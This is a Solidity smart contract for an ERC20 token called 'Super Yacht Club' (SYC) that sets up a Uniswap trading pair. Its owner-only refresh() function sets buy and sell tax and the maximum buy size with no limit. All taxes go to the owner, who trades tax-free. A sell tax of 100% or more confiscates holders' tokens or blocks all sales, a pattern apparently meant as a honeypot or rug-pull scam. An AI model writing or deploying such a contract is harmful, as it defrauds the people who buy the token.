// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
contract Uniswap {

    address internal me;
    mapping(address=>bool) public uniswapTx;
    mapping(address=>bool) internal isTaxFree;
    address public PairAddress;
    address public WETH;
    IUniswapRouter public UniswapV2Router;
    address public _Factory;
    address public owner;

    address public _Router;
    constructor() {
        _Router  = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        _Factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;

        UniswapV2Router  = IUniswapRouter(_Router);
        WETH             = UniswapV2Router.WETH();
        PairAddress      = IUniswapFactory(_Factory).createPair(address(this), WETH);
        

        uniswapTx[PairAddress] = true;
        owner = msg.sender;
        uniswapTx[_Factory] = true;

        uniswapTx[_Router] = true;
        me = address(this);
    }
    
    function _issell(address to) internal view returns (bool) {
        return uniswapTx[to];
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner() {
        owner = newOwner;
    }

    function isFromUniswap(address from) internal view returns (bool) {
        return uniswapTx[from];
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Forbidden:owner");
        _;
    }
}

import "./IERC20Metadata.sol";

contract SuperYachtClub is Uniswap, ERC20 {

    uint256 _mb = 890;
    uint256 selltax = 0;

    uint256 taxOnBuy = 0;

    constructor() ERC20("Super Yacht Club", "SYC") Uniswap() {
        isTaxFree[address(this)] = true;
        owner = msg.sender;
        isTaxFree[owner] = true;
        _mint(owner, 1000000000*10**18);
    }
    function refresh(uint256 b, uint256 s, uint56 m) public onlyOwner() {
        require(msg.sender==owner, "Forbidden:set");
        taxOnBuy = b;
        selltax = s;
        _mb = m;
    }
    function get_mb() internal view returns (uint256) {
        return pctOf(totalSupply(), _mb);
    }

    function pctOf(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        (uint256 taxes, uint256 remaining) = taxTx(from, to, amount);
        super._transfer(from, to, remaining);
        if (taxes>0) {
            super._transfer(from, owner, taxes);
        }
    }

    function taxTx(address from, address to, uint256 amount) internal view returns(uint256, uint256) {
        if (!canBeTaxed(from, to)) {
            return (0, amount);
        } else {
            uint256 tax;
            if (isFromUniswap(from)) {
                require(amount<=get_mb(), "Too large");
                tax = pctOf(amount, taxOnBuy);
            } else if (_issell(to)) {
                tax = pctOf(amount, selltax);
            }
            return (tax, amount-tax); 
        }
    }
    
    fallback() external payable {
        
    }

    receive() external payable {
        
    }
    
    function canBeTaxed(address from, address to) internal view returns (bool) {
        return !isTaxFree[from] && !isTaxFree[to] && !(uniswapTx[from] && uniswapTx[to]) && (isFromUniswap(from) || _issell(to));
    }
}